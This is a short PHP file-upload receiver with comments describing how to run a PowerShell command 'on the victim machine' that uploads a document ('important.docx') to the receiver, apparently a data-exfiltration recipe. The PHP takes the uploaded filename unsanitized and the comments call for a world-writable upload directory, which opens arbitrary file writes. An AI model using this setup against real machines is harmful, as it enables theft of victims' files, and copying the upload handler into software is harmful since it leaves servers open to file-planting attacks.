<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

// Chmod 777 on uploaddir
// On the victim machine run the following powershell command. Use full path
// (New-Object System.Net.WebClient).UploadFile('http://127.0.0.1/upload.php', 'important.docx')
